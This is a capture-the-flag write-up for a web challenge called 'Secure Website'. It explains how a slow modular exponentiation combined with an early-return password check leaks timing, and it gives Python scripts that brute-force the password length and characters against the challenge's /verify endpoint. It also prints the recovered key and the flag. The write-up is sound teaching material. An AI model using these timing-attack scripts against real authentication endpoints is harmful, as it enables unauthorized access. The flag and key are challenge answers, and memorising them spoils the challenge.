# Secure Website
> I have like so many things that I want to do, but I am not sure if I want others to see them yet D: I guess I will just hide all the super important stuff behind my super super fortified and secure [Password Checker](http://litctf.live:31776/)!
>
> Downloads
> [SecureWebsite.zip](https://drive.google.com/uc?export=download&id=1ixlV54JoFOGziLzlOewPBijbtePZo8SI)

## Identifying the vulnerability
Let's take a look at `modPow` function:
```js
function modPow(base,exp,mod) {
	var result = 1;
	for(var i = 0;i < exp;++i) {
		result = (result * base) % mod;
	}
	return result;
}
```
Instead of using quick exponentiation, it iterates over all integers smaller than `exp` which makes it extremely slow.
And given that `checkPassword` returns early when the first wrong character is found:
```js
function checkPassword(password,pass) {
	var arr = pass.split(",");
	for(var i = 0;i < arr.length;++i) {
		arr[i] = parseInt(arr[i]);
	}

	if(arr.length != password.length) return false;
	for(var i = 0;i < arr.length;++i) {
		var currentChar = password.charCodeAt(i);
		var currentInput = decryptRSA(arr[i]);
		if(currentChar != currentInput) return false;
	}
	return true;
}
```
We can perform a timing attack.

## Exploiting the vulnerability
First, we have to determine the length of the password. The following script can be used:
```py
import requests


def encrypt(c):
	return str(pow(ord(c), 17, 3217 * 6451))


url = 'http://litctf.live:31776/verify'

for i in range(1, 20):
	ct = ','.join(map(encrypt, 'a' * i))
	r = requests.get(
		url,
		params={
			'password': ct
		},
		allow_redirects=False
	)

	print(f'{i}: ({r.status_code}) {r.elapsed.total_seconds()}')
```
It can be seen that the response time is slightly longer for 6 characters and therefore the key is probably 6 characters long.
Now it's time to bruteforce the key.
Unfortunately, the server response times aren't constant enough to completely automate the key extraction; therefore, for each character I've run the script and waited until it went through all alphanumeric characters, and then (if it was possible) determined the correct character and rerun the script with updated key.
The following Python script helps to get the key:
```py
import requests
from string import ascii_letters, digits


def encrypt(c):
	return str(pow(ord(c), 17, 3217 * 6451))


alnum = ascii_letters + digits

url = 'http://litctf.live:31776/verify'
# key length: 6 chars
key = ''

for c in alnum:
	curr = key + c
	ct = ','.join(map(encrypt, curr + '_' * (6 - len(curr))))
	r = requests.get(
		url,
		params={
			'password': ct
		},
		allow_redirects=False
	)

  # note: for initial 5 characters, determine the correct guess according to response time; for the last character, look at status codes
	print(f'{curr}: ({r.status_code}) {r.elapsed.total_seconds()}')
```
The key is `CxIj6p`.

## Flag
`LITCTF{uwu_st3ph4ni3_i5_s0_0rz_0rz_0TZ}`
